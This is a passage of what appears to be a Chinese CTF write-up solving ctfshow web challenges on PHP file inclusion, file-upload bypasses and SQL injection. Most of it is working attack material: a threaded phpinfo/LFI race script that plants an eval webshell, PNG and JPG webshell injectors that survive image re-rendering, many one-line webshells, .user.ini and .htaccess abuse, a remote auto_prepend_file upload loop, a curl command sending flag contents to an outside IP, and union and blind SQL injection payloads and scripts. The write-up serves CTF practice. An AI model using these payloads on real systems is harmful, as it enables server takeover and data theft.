$this-\u0026gt;secret; 28 } 29 30 public function isVIP(){ 31 return $this-\u0026gt;vip?TRUE:FALSE; 32 } 33 } 34 35 function __autoload($class){ 36 if(isset($class)){ 37 $class(); 38 } 39} 40 41#过滤字符 42$key = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; 43if(preg_match(\u0026#39;/\\_| |\\[|\\]|\\?/\u0026#39;, $key)){ 44 die(\u0026#34;error\u0026#34;); 45} 46$ctf = $_POST[\u0026#39;ctf\u0026#39;]; 47extract($_GET); 48if(class_exists($__CTFSHOW__)){ 49 echo \u0026#34;class is exists!\u0026#34;; 50} 51 52if($isVIP \u0026amp;\u0026amp; strrpos($ctf, \u0026#34;:\u0026#34;)===FALSE){ 53 include($ctf); 54} 这题存在非预期，可以通过extract变量覆盖使isVIP=true，接着进行日志注入\n或者\n把马写到日志里\npayload:\nGET ?isVIP=true\u0026amp;1=system(\u0026#39;cat f*\u0026#39;); POST ctf=/var/log/nginx/access.log web150plus 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-19 07:12:57 9 10*/ 11include(\u0026#34;flag.php\u0026#34;); 12error_reporting(0); 13highlight_file(__FILE__); 14 15class CTFSHOW{ 16 private $username; 17 private $password; 18 private $vip; 19 private $secret; 20 21 function __construct(){ 22 $this-\u0026gt;vip = 0; 23 $this-\u0026gt;secret = $flag; 24 } 25 26 function __destruct(){ 27 echo $this-\u0026gt;secret; 28 } 29 30 public function isVIP(){ 31 return $this-\u0026gt;vip?TRUE:FALSE; 32 } 33 } 34 35 function __autoload($class){ 36 if(isset($class)){ 37 $class(); 38 } 39} 40 41#过滤字符 42$key = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; 43if(preg_match(\u0026#39;/\\_| |\\[|\\]|\\?/\u0026#39;, $key)){ 44 die(\u0026#34;error\u0026#34;); 45} 46$ctf = $_POST[\u0026#39;ctf\u0026#39;]; 47extract($_GET); 48if(class_exists($__CTFSHOW__)){ 49 echo \u0026#34;class is exists!\u0026#34;; 50} 51 52if($isVIP \u0026amp;\u0026amp; strrpos($ctf, \u0026#34;:\u0026#34;)===FALSE \u0026amp;\u0026amp; strrpos($ctf,\u0026#34;log\u0026#34;)===FALSE){ 53 include($ctf); 54} 这题ban掉了非预期解 日志注入的方法\n首先我们需要知道__autoload方法的作用\n__autoload()：自动加载函数，当使用未定义的类时会自动调用该函数。如果$class变量已设置，则将其作为函数调用。 而且这题的__autoload并不在类CTFSHOW中（障眼法）\n这个类在isVIP后面已经结束了\n所以我们可以通过\nif(class_exists($__CTFSHOW__)){ echo \u0026#34;class is exists!\u0026#34;; } 调用任意的类\n我们可以根据php会将.解析成_的特性绕过正则\nGET ?..CTFSHOW..=phpinfo 由于原题需要竞争所以后面就直接把flag放环境变量了\n这里我们直接在phpinfo里面找就行\n原题解法 拿到phpinfo我们就可以getshell了\nPHP LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。假如在服务器上找不到我们可以包含的文件，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包含的文件了。如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。 原文链接：https://blog.csdn.net/qq_63701832/article/details/129337902\n过程 1.发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据\n2.phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大\n3.php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接\n4.操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包\n5.此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除\n6.利用这个时间差，发第二个数据包，即可成功包含临时文件，最终getshell\n处理 PHP 对 enctype=\u0026ldquo;multipart/form-data\u0026quot;请求的处理过程如下： 1、请求到达； 2、创建临时文件（通常是/tmp/php[6 个随机字符]），并写入上传文件的内容； 3、调用相应 PHP 脚本进行处理，如校验名称、大小等； 4、删除临时文件。 总结 php post 上传文件产生临时文件，phpinfo读临时文件的路径和名字，本地包含后生成后门 原文链接：https://blog.csdn.net/qq_63701832/article/details/129337902\n大佬的脚本，但是是python2的\n1#!/usr/bin/python 2import sys 3import threading 4import socket 5 6def setup(host, port): 7 TAG=\u0026#34;Security Test\u0026#34; 8 PAYLOAD=\u0026#34;\u0026#34;\u0026#34;%s\\r 9\u0026lt;?php file_put_contents(\u0026#39;/tmp/g\u0026#39;, \u0026#39;\u0026lt;?=eval($_REQUEST[1])?\u0026gt;\u0026#39;)?\u0026gt;\\r\u0026#34;\u0026#34;\u0026#34; % TAG 10 REQ1_DATA=\u0026#34;\u0026#34;\u0026#34;-----------------------------7dbff1ded0714\\r 11Content-Disposition: form-data; name=\u0026#34;dummyname\u0026#34;; filename=\u0026#34;test.txt\u0026#34;\\r 12Content-Type: text/plain\\r 13\\r 14%s 15-----------------------------7dbff1ded0714--\\r\u0026#34;\u0026#34;\u0026#34; % PAYLOAD 16 padding=\u0026#34;A\u0026#34; * 5000 17 REQ1=\u0026#34;\u0026#34;\u0026#34;POST /06/phpinfo.php?a=\u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34; HTTP/1.1\\r 18Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34;\\r 19HTTP_ACCEPT: \u0026#34;\u0026#34;\u0026#34; + padding + \u0026#34;\u0026#34;\u0026#34;\\r 20HTTP_USER_AGENT: \u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34;\\r 21HTTP_ACCEPT_LANGUAGE: \u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34;\\r 22HTTP_PRAGMA: \u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34;\\r 23Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r 24Content-Length: %s\\r 25Host: %s\\r 26\\r 27%s\u0026#34;\u0026#34;\u0026#34; %(len(REQ1_DATA),host,REQ1_DATA) 28 #modify this to suit the LFI script 29 LFIREQ=\u0026#34;\u0026#34;\u0026#34;GET /06/lfi.php?file=%s HTTP/1.1\\r 30User-Agent: Mozilla/4.0\\r 31Proxy-Connection: Keep-Alive\\r 32Host: %s\\r 33\\r 34\\r 35\u0026#34;\u0026#34;\u0026#34; 36 return (REQ1, TAG, LFIREQ) 37 38def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): 39 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 40 s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 41 42 s.connect((host, port)) 43 s2.connect((host, port)) 44 45 s.send(phpinforeq) 46 d = \u0026#34;\u0026#34; 47 while len(d) \u0026lt; offset: 48 d += s.recv(offset) 49 try: 50 i = d.index(\u0026#34;[tmp_name] =\u0026amp;gt; \u0026#34;) 51 fn = d[i+17:i+31] 52 except ValueError: 53 return None 54 55 s2.send(lfireq % (fn, host)) 56 d = s2.recv(4096) 57 s.close() 58 s2.close() 59 60 if d.find(tag) != -1: 61 return fn 62 63counter=0 64class ThreadWorker(threading.Thread): 65 def __init__(self, e, l, m, *args): 66 threading.Thread.__init__(self) 67 self.event = e 68 self.lock = l 69 self.maxattempts = m 70 self.args = args 71 72 def run(self): 73 global counter 74 while not self.event.is_set(): 75 with self.lock: 76 if counter \u0026gt;= self.maxattempts: 77 return 78 counter+=1 79 80 try: 81 x = phpInfoLFI(*self.args) 82 if self.event.is_set(): 83 break 84 if x: 85 print \u0026#34;\\nGot it! Shell created in /tmp/g\u0026#34; 86 self.event.set() 87 88 except socket.error: 89 return 90 91 92def getOffset(host, port, phpinforeq): 93 \u0026#34;\u0026#34;\u0026#34;Gets offset of tmp_name in the php output\u0026#34;\u0026#34;\u0026#34; 94 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 95 s.connect((host,port)) 96 s.send(phpinforeq) 97 98 d = \u0026#34;\u0026#34; 99 while True: 100 i = s.recv(4096) 101 d+=i 102 if i == \u0026#34;\u0026#34;: 103 break 104 # detect the final chunk 105 if i.endswith(\u0026#34;0\\r\\n\\r\\n\u0026#34;): 106 break 107 s.close() 108 i = d.find(\u0026#34;[tmp_name] =\u0026amp;gt; \u0026#34;) 109 if i == -1: 110 raise ValueError(\u0026#34;No php tmp_name in phpinfo output\u0026#34;) 111 112 print \u0026#34;found %s at %i\u0026#34; % (d[i:i+10],i) 113 # padded up a bit 114 return i+256 115 116def main(): 117 118 print \u0026#34;LFI With PHPInfo()\u0026#34; 119 print \u0026#34;-=\u0026#34; * 30 120 121 if len(sys.argv) \u0026lt; 2: 122 print \u0026#34;Usage: %s host [port] [threads]\u0026#34; % sys.argv[0] 123 sys.exit(1) 124 125 try: 126 host = socket.gethostbyname(sys.argv[1]) 127 except socket.error, e: 128 print \u0026#34;Error with hostname %s: %s\u0026#34; % (sys.argv[1], e) 129 sys.exit(1) 130 131 port=80 132 try: 133 port = int(sys.argv[2]) 134 except IndexError: 135 pass 136 except ValueError, e: 137 print \u0026#34;Error with port %d: %s\u0026#34; % (sys.argv[2], e) 138 sys.exit(1) 139 140 poolsz=10 141 try: 142 poolsz = int(sys.argv[3]) 143 except IndexError: 144 pass 145 except ValueError, e: 146 print \u0026#34;Error with poolsz %d: %s\u0026#34; % (sys.argv[3], e) 147 sys.exit(1) 148 149 print \u0026#34;Getting initial offset...\u0026#34;, 150 reqphp, tag, reqlfi = setup(host, port) 151 offset = getOffset(host, port, reqphp) 152 sys.stdout.flush() 153 154 maxattempts = 1000 155 e = threading.Event() 156 l = threading.Lock() 157 158 print \u0026#34;Spawning worker pool (%d)...\u0026#34; % poolsz 159 sys.stdout.flush() 160 161 tp = [] 162 for i in range(0,poolsz): 163 tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) 164 165 for t in tp: 166 t.start() 167 try: 168 while not e.wait(1): 169 if e.is_set(): 170 break 171 with l: 172 sys.stdout.write( \u0026#34;\\r% 4d / % 4d\u0026#34; % (counter, maxattempts)) 173 sys.stdout.flush() 174 if counter \u0026gt;= maxattempts: 175 break 176 print 177 if e.is_set(): 178 print \u0026#34;Woot! \\m/\u0026#34; 179 else: 180 print \u0026#34;:(\u0026#34; 181 except KeyboardInterrupt: 182 print \u0026#34;\\nTelling threads to shutdown...\u0026#34; 183 e.set() 184 185 print \u0026#34;Shuttin\u0026#39; down...\u0026#34; 186 for t in tp: 187 t.join() 188 189if __name__==\u0026#34;__main__\u0026#34;: 190 main() 文件上传 web151 前台验证\n将一句话木马改成png，抓包修改后缀即可\npayload:\n1=system(\u0026#39;cat /var/www/html/flag.php\u0026#39;); web152 这道题没有前端检验，但是解法跟web151是一样的\nweb153 一开始尝试了大小写绕过\n上传后发现服务器不解析\n这题可以利用.user.ini来进行文件上传\n[文件上传]浅析.user.ini的利用-CSDN博客\n首先我们在文件中写入\n这句话相当于php中的文件包含\n写入后将文件改为png上传，抓包将文件名改为.user.ini\n接着将一句话木马改为1.png上传\n接着访问 /upload/index.php\npayload:\n1=system(\u0026#39;tac ../f*\u0026#39;); 注意这个方法的前提是文件上传的目录中有能够执行的php的文件（如index.php）\nweb154 这题跟上题差不多，只是过滤了php\n将一句话木马改成短标签的形式就可以了（我一直用的短标签所以没什么影响）\nweb155 解法同web154一样\nweb156 这题有新的waf,可以测出来waf掉了[]\n那既然这样我们直接读flag就是了\n\u0026lt;?=system(\u0026#39;cat ../f*\u0026#39;);?\u0026gt; 或者也可以用{}代替[\u0026rsquo;\u0026rsquo;]\n\u0026lt;?=@eval($_GET{1});?\u0026gt; web157 这道题[]和;都被waf了\npayload:\n\u0026lt;?=system(\u0026#34;tac ../f*\u0026#34;)?\u0026gt; 不写;就行了\nweb158 这题和上题的解法一样\nweb159 这题waf掉了()\n没有()怎么进行rce呢？我们可以想到``进行命令执行的技巧\npayload:\n\u0026lt;?=`tac ../f*`?\u0026gt; web160 一开始发现.user.ini穿不上，后面测到原来是空格被waf了，.user.ini里也不能有空格\n相比上一题这题将空格和``反引号和log过滤掉了\n这题我们可以考虑使用日志注入的方法\n尝试一下包含日志 nginx的log在/var/log/nginx/access.log\npayload:\n\u0026lt;?=include\u0026#34;/var/l\u0026#34;.\u0026#34;og/nginx/access.l\u0026#34;.\u0026#34;og\u0026#34;?\u0026gt; 看到有user-agent说明这条路行得通\n直接读flag\nweb161 这一题在上一题的基础上增加了文件头的检验\n我们可以通过在上传文件的时候加上图片的文件头GIF89a进行绕过\n其余和web160无异，利用文件包含进行日志注入即可\nweb162 fuzz一下可以发现这题把.也ban掉了\n所以我们在上传的.user.ini时我们可以去掉文件后缀\nGIF89a auto_prepend_file=1 接下来考虑怎么构造读flag\n可以通过取反绕过.的过滤，进行文件包含\n\u0026lt;?=$a=\u0026#34;Ñ\u0026#34;?\u0026gt; \u0026lt;?=$b=~$a?\u0026gt; \u0026lt;?=$l=\u0026#34;l\u0026#34;?\u0026gt; \u0026lt;?=$o=\u0026#34;o\u0026#34;?\u0026gt; \u0026lt;?=$g=\u0026#34;g\u0026#34;?\u0026gt; \u0026lt;?=include\u0026#34;/var/$l$o$g/nginx/access$b$l$o$g\u0026#34;?\u0026gt; 文件 1 中的内容 下面的Ñ 为 . 取反后的字符 十六进制为 D1，利用的时候，在brup 中更改hex里的值。\n日志注入即可\nweb163 这题和上题的条件差不多，但是存在竞争条件，上传图片的话会被删掉\n这题我们尝试使用远程文件包含\n我们把payload写在服务器上，然后起一个http服务\n记住，文件包含时要把ip转换成长整型（.被waf了）\nGIF89a auto_prepend_file=http://长整型ip:7777/s 传.user.ini\n接着搓一个发包脚本\n1import requests 2 3while True: 4 burp0_url = \u0026#34;http://3de6e682-59e3-489c-8e72-2b74e3db5058.challenge.ctf.show/\u0026#34; 5 burp1_url = \u0026#34;http://3de6e682-59e3-489c-8e72-2b74e3db5058.challenge.ctf.show/upload/\u0026#34; 6 burp0_headers = {\u0026#34;Sec-Ch-Ua-Platform\u0026#34;: \u0026#34;\\\u0026#34;Windows\\\u0026#34;\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Sec-Ch-Ua\u0026#34;: \u0026#34;\\\u0026#34;Not?A_Brand\\\u0026#34;;v=\\\u0026#34;99\\\u0026#34;, \\\u0026#34;Chromium\\\u0026#34;;v=\\\u0026#34;130\\\u0026#34;\u0026#34;, \u0026#34;Sec-Ch-Ua-Mobile\u0026#34;: \u0026#34;?0\u0026#34;, \u0026#34;X-Requested-With\u0026#34;: \u0026#34;XMLHttpRequest\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;application/json, text/javascript, */*; q=0.01\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;multipart/form-data; boundary=----WebKitFormBoundaryBcDoqZWhQP52WEA6\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;https://938b9a73-97ad-4b15-81d8-0101678e16f8.challenge.ctf.show\u0026#34;, \u0026#34;Sec-Fetch-Site\u0026#34;: \u0026#34;same-origin\u0026#34;, \u0026#34;Sec-Fetch-Mode\u0026#34;: \u0026#34;cors\u0026#34;, \u0026#34;Sec-Fetch-Dest\u0026#34;: \u0026#34;empty\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;https://938b9a73-97ad-4b15-81d8-0101678e16f8.challenge.ctf.show/\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Priority\u0026#34;: \u0026#34;u=1, i\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 7 burp0_data = \u0026#34;------WebKitFormBoundaryBcDoqZWhQP52WEA6\\r\\nContent-Disposition: form-data; name=\\\u0026#34;file\\\u0026#34;; filename=\\\u0026#34;.user.ini\\\u0026#34;\\r\\nContent-Type: image/png\\r\\n\\r\\nGIF89a\\r\\nauto_prepend_file=http://长整型ip:7777/shell\\r\\n------WebKitFormBoundaryBcDoqZWhQP52WEA6--\\r\\n\u0026#34; 8 log = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 9 log1 = requests.get(burp1_url) 10 print(log.status_code) 11 print(\u0026#39;\\n\u0026#39;) 12 print(log1.text) 13 if \u0026#34;ctfshow\u0026#34; in log1.text: 14 print(\u0026#39;getflag\u0026#39;) 15 break web164 这题随便传个图片试试发现多了个查看图片\nhttps://775e9cd3-3a73-47a1-b31d-7b4450ec5573.challenge.ctf.show/download.php?image=94f7678cc4cda39c02c7890bc8fe6941.png 从url我们可以看出这题存在图片包含\n我们可以利用这个文件包含去执行我们的图片马\n大佬的脚本，可以绕过二次渲染\n1\u0026lt;?php 2$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 3 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 4 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 5 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 6 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 7 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 8 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 9 0x66, 0x44, 0x50, 0x33); 10 11 12 13$img = imagecreatetruecolor(32, 32); 14 15for ($y = 0; $y \u0026lt; sizeof($p); $y += 3) { 16 $r = $p[$y]; 17 $g = $p[$y+1]; 18 $b = $p[$y+2]; 19 $color = imagecolorallocate($img, $r, $g, $b); 20 imagesetpixel($img, round($y / 3), 0, $color); 21} 22 23imagepng($img,\u0026#39;./1.png\u0026#39;); 24?\u0026gt; 图片马的内容 \u0026lt;?$_GET[0]($_POST[1]);?\u0026gt; 没有回显\n外带读flag\nPOST 1=cat f* | curl -X POST -d @- http://106.55.168.231:7777/ GET 0=system web165 这题考察的也是图片马，但是是用jpg的图片马绕过二次渲染\n大佬的脚本\n1\u0026lt;?php 2 /* 3 4 The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). 5 It is necessary that the size and quality of the initial image are the same as those of the processed image. 6 7 1) Upload an arbitrary image via secured files upload script 8 2) Save the processed image and launch: 9 jpg_payload.php \u0026lt;jpg_name.jpg\u0026gt; 10 11 In case of successful injection you will get a specially crafted image, which should be uploaded again. 12 13 Since the most straightforward injection method is used, the following problems can occur: 14 1) After the second processing the injected data may become partially corrupted. 15 2) The jpg_payload.php script outputs \u0026#34;Something\u0026#39;s wrong\u0026#34;. 16 If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. 17 18 Sergey Bobrov @Black2Fan. 19 20 See also: 21 https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ 22 23 */ 24\t25 $miniPayload = \u0026#34;\u0026lt;?=eval(\\$_POST[7]);?\u0026gt;\u0026#34;; //注意$转义 26 27 28 if(!extension_loaded(\u0026#39;gd\u0026#39;) || !function_exists(\u0026#39;imagecreatefromjpeg\u0026#39;)) { 29 die(\u0026#39;php-gd is not installed\u0026#39;); 30 } 31 32 if(!isset($argv[1])) { 33 die(\u0026#39;php jpg_payload.php \u0026lt;jpg_name.jpg\u0026gt;\u0026#39;); 34 } 35 36 set_error_handler(\u0026#34;custom_error_handler\u0026#34;); 37 38 for($pad = 0; $pad \u0026lt; 1024; $pad++) { 39 $nullbytePayloadSize = $pad; 40 $dis = new DataInputStream($argv[1]); 41 $outStream = file_get_contents($argv[1]); 42 $extraBytes = 0; 43 $correctImage = TRUE; 44 45 if($dis-\u0026gt;readShort() != 0xFFD8) { 46 die(\u0026#39;Incorrect SOI marker\u0026#39;); 47 } 48 49 while((!$dis-\u0026gt;eof()) \u0026amp;\u0026amp; ($dis-\u0026gt;readByte() == 0xFF)) { 50 $marker = $dis-\u0026gt;readByte(); 51 $size = $dis-\u0026gt;readShort() - 2; 52 $dis-\u0026gt;skip($size); 53 if($marker === 0xDA) { 54 $startPos = $dis-\u0026gt;seek(); 55 $outStreamTmp = 56 substr($outStream, 0, $startPos) . 57 $miniPayload . 58 str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize) . 59 substr($outStream, $startPos); 60 checkImage(\u0026#39;_\u0026#39;.$argv[1], $outStreamTmp, TRUE); 61 if($extraBytes !== 0) { 62 while((!$dis-\u0026gt;eof())) { 63 if($dis-\u0026gt;readByte() === 0xFF) { 64 if($dis-\u0026gt;readByte !== 0x00) { 65 break; 66 } 67 } 68 } 69 $stopPos = $dis-\u0026gt;seek() - 2; 70 $imageStreamSize = $stopPos - $startPos; 71 $outStream = 72 substr($outStream, 0, $startPos) . 73 $miniPayload . 74 substr( 75 str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize). 76 substr($outStream, $startPos, $imageStreamSize), 77 0, 78 $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 79 substr($outStream, $stopPos); 80 } elseif($correctImage) { 81 $outStream = $outStreamTmp; 82 } else { 83 break; 84 } 85 if(checkImage(\u0026#39;payload_\u0026#39;.$argv[1], $outStream)) { 86 die(\u0026#39;Success!\u0026#39;); 87 } else { 88 break; 89 } 90 } 91 } 92 } 93 unlink(\u0026#39;payload_\u0026#39;.$argv[1]); 94 die(\u0026#39;Something\\\u0026#39;s wrong\u0026#39;); 95 96 function checkImage($filename, $data, $unlink = FALSE) { 97 global $correctImage; 98 file_put_contents($filename, $data); 99 $correctImage = TRUE; 100 imagecreatefromjpeg($filename); 101 if($unlink) 102 unlink($filename); 103 return $correctImage; 104 } 105 106 function custom_error_handler($errno, $errstr, $errfile, $errline) { 107 global $extraBytes, $correctImage; 108 $correctImage = FALSE; 109 if(preg_match(\u0026#39;/(\\d+) extraneous bytes before marker/\u0026#39;, $errstr, $m)) { 110 if(isset($m[1])) { 111 $extraBytes = (int)$m[1]; 112 } 113 } 114 } 115 116 class DataInputStream { 117 private $binData; 118 private $order; 119 private $size; 120 121 public function __construct($filename, $order = false, $fromString = false) { 122 $this-\u0026gt;binData = \u0026#39;\u0026#39;; 123 $this-\u0026gt;order = $order; 124 if(!$fromString) { 125 if(!file_exists($filename) || !is_file($filename)) 126 die(\u0026#39;File not exists [\u0026#39;.$filename.\u0026#39;]\u0026#39;); 127 $this-\u0026gt;binData = file_get_contents($filename); 128 } else { 129 $this-\u0026gt;binData = $filename; 130 } 131 $this-\u0026gt;size = strlen($this-\u0026gt;binData); 132 } 133 134 public function seek() { 135 return ($this-\u0026gt;size - strlen($this-\u0026gt;binData)); 136 } 137 138 public function skip($skip) { 139 $this-\u0026gt;binData = substr($this-\u0026gt;binData, $skip); 140 } 141 142 public function readByte() { 143 if($this-\u0026gt;eof()) { 144 die(\u0026#39;End Of File\u0026#39;); 145 } 146 $byte = substr($this-\u0026gt;binData, 0, 1); 147 $this-\u0026gt;binData = substr($this-\u0026gt;binData, 1); 148 return ord($byte); 149 } 150 151 public function readShort() { 152 if(strlen($this-\u0026gt;binData) \u0026lt; 2) { 153 die(\u0026#39;End Of File\u0026#39;); 154 } 155 $short = substr($this-\u0026gt;binData, 0, 2); 156 $this-\u0026gt;binData = substr($this-\u0026gt;binData, 2); 157 if($this-\u0026gt;order) { 158 $short = (ord($short[1]) \u0026lt;\u0026lt; 8) + ord($short[0]); 159 } else { 160 $short = (ord($short[0]) \u0026lt;\u0026lt; 8) + ord($short[1]); 161 } 162 return $short; 163 } 164 165 public function eof() { 166 return !$this-\u0026gt;binData||(strlen($this-\u0026gt;binData) === 0); 167 } 168 } 169?\u0026gt; jpg图片比较脆弱，成功率很低，我试了十多张图片都没成功\nweb166 zip注入\n这题只能上传zip，上传后会出现查看文件，存在文件包含\n本质上就是利用文件包含执行我们的恶意代码\nweb167 .htaccess文件利用\n什么是.htaccess？\nhtaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。\n如果服务器开启了.htaccess，那我们就可以利用.htaccess将jpg或者png等后缀的文件，作为php文件解析\nAddType/AddHandler application/x-httpd-php \u0026#34;.jpg\u0026#34; 由于有前端验证，我们要先把编写好的.htaccess文件改为.jpg后缀\n再通过抓包将文件名修改为.htaccess\n接着上传我们写好的一句话木马(后缀为.jpg)\n可以看到我们的一句话木马已经被成功执行了\nweb168 基础免杀\n这题没有限制文件类型，可以上传php\n应该是对关键词有过滤\n简单拼接一下试试，没想到直接成功了\npayload\n\u0026lt;?php $a=\u0026#34;sys\u0026#34;.\u0026#34;tem\u0026#34;; $a($_REQUEST[1]);? GET 1=tac%20../flagaa.php web169 .user.ini文件包含\n前端做了校验只能传zip文件,后端又做了图片文件检查(需要改成image/png).过滤了\u0026lt;\u0026gt;和php\n先上传一个index.php，然后利用日志包含，上传.user.ini 写入以下内容进行包含然后UA里面写木马\nauto_append_file=\u0026#34;/var/log/nginx/access.log\u0026#34; \u0026lt;?=system(\u0026#39;cat ../flagaa.php\u0026#39;)?\u0026gt; web170 这题和web169解法一样，也是可以进行日志包含\nsql注入 无过滤注入（对输出内容进行过滤） web171 $sql = \u0026#34;select username,password from user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39; limit 1;\u0026#34;; flag是存在于username为flag的用户的数据中，我们只需要通过\n1\u0026#39; or 1=1 --+ 即可输出所有用户数据\nweb172 相比上一题，这题增加了过滤\n//检查结果是否有flag if($row-\u0026gt;username!==\u0026#39;flag\u0026#39;){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;查询成功\u0026#39;; } 方法一: 联合查询\n因为联合查询只会显示password\napi/?id=1\u0026#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23 /api/?id=1\u0026#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;ctfshow_web\u0026#39;),database()%23 /api/?id=1\u0026#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;ctfshow_web\u0026#39; and table_name=\u0026#39;ctfshow_user\u0026#39;),database()%23 //看到有3列 id,username,password /api/?id=1\u0026#39; union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user),database()%23 //查询password发现没有flag //查另一个表 ctfshow_user2 /api/?id=1\u0026#39; union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user2),database()%23 //看到flag 方法二: 将用户名字段进行编码，绕过检测\n-1\u0026#39; union select to_base64(username),password from ctfshow_user2 --+ 方法三: 只查询密码\n-1\u0026#39; union select id,password from ctfshow_user2 where username=\u0026#39;flag web173 过滤要求查询结果中不能出现flag字段\n//检查结果是否有flag if(!preg_match(\u0026#39;/flag/i\u0026#39;, json_encode($ret))){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;查询成功\u0026#39;; } 方法一：联合查询\n和上题解法一样，只是这题flag在ctfshow_user3\n方法二：\n只查询password\n-1\u0026#39; union select id,id,password from ctfshow_user3 where username=\u0026#39;flag 方法三: 将用户名字段进行编码，绕过检测\n-1\u0026#39; union select to_base64(username),password from ctfshow_user3 --+ web174 输出时增加了过滤数字\n//检查结果是否有flag和数字 if(!preg_match(\u0026#39;/flag|[0-9]/i\u0026#39;, json_encode($ret))){ $ret[\u0026#39;msg\u0026#39;]=\u0026#39;查询成功\u0026#39;; } 由于flag中含有数字，哪怕像之前的通过to_base64等编码后，仍然不可避免数字的出现\n所以这题我们要用到布尔盲注\n放个脚本\n1# @Author:Y4tacker 2import requests 3 4url = \u0026#34;http://e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show/api/v4.php?id=1\u0026#39; and \u0026#34; 5 6result = \u0026#39;\u0026#39; 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 payload = f\u0026#39;1=if(ascii(substr((select password from ctfshow_user4 limit 24,1),{i},1))\u0026gt;{mid},1,0) -- -\u0026#39; 17 r = requests.get(url + payload) 18 if \u0026#34;admin\u0026#34; in r.text: 19 head = mid + 1 20 else: 21 tail = mid 22 23 if head != 32: 24 result += chr(head) 25 else: 26 break 27 print(result) 又或者通过replace方法将数字替换成其他的合法字符\n1\u0026#39; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,\u0026#39;A\u0026#39;),2,\u0026#39;B\u0026#39;),3,\u0026#39;C\u0026#39;),4,\u0026#39;D\u0026#39;),5,\u0026#39;E\u0026#39;),6,\u0026#39;F\u0026#39;),7,\u0026#39;G\u0026#39;),8,\u0026#39;H\u0026#39;),9,\u0026#39;I\u0026#39;),0,\u0026#39;J\u0026#39;),\u0026#39;b\u0026#39; from ctfshow_user4 where username=\u0026#39;flag\u0026#39; %23 拿到flag后替换回去就行\n1import base64 2 3flag64 = 